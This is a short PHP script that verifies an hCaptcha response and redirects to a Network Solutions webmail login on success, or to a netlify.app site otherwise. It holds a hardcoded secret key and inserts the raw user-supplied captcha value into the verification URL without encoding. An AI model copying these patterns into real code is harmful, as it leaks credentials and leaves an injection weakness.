<?php
if(isset($_POST['submit'])){
    if(isset($_POST['h-captcha-response']) && !empty($_POST['h-captcha-response'])){
        $secret = "0xe1c668780cf6ec82093E223032dB60eA44460f0b";
        $remote_address = $_SERVER['REMOTE_ADDR'];
        $verify_url = "https://hcaptcha.com/siteverify?secret=".$secret."&response=".$_POST['h-captcha-response']."&remoteip=".$remote_address;

        $response = file_get_contents($verify_url);
        $responseData = json_decode($response);

        if($responseData->success){
             print "<meta http-equiv=\"refresh\" content=\"0;URL=https://webmail.networksolutionsemail.com/ox6/interfaces/sso/login.php\">";
        }else{
            print "<meta http-equiv=\"refresh\" content=\"0;URL=https://compassionate-blackwell-091edf.netlify.app\">";
        }
    }else{
        print "<meta http-equiv=\"refresh\" content=\"0;URL=https://compassionate-blackwell-091edf.netlify.app\">";
    }
}
?>